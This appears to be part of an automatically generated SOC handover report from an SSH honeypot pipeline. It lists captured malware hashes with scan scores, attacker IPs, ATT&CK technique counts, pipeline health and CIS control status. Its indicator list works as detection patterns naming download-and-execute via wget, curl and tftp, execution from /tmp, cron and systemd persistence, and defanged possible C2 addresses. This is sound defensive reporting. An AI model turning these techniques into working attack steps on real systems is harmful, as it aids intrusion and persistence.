| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `118.145.239[.]129` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 18 |
| `64.62.197[.]182` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `117.72.34[.]40` | CN | Beijing Jingdong 360 Degree E-commerce Co., Ltd. | **100** ⚠️ | 5 |
| `193.47.62[.]69` | NL | BESTDC LIMITED | **100** ⚠️ | 50 |
| `43.133.61[.]254` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |
| `45.91.64[.]10` | RU | F6 | **100** ⚠️ | 24 |
| `129.121.96[.]251` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 1 |
| `36.255.97[.]33` | DE | Cyber Security PH | **100** ⚠️ | 7 |
| `109.160.32[.]163` | NL | Global Communication Net Plc | **100** ⚠️ | 2 |
| `8.152.99[.]77` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 26 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 239 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 189 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 74 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 61 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 28 |

---

## 🔕 False Positive Summary (68 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 20 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 415 cases |
| Tool 34  | Credential Extractor        | ✅ 1157 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 30 fingerprints |
| Tool 36  | Command Clustering          | ✅ 23 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 270 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 68 filtered (16.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 117 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 187 priority case(s) shown individually · 149 recon entry/entries in table (9 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-02T17:00:08Z_
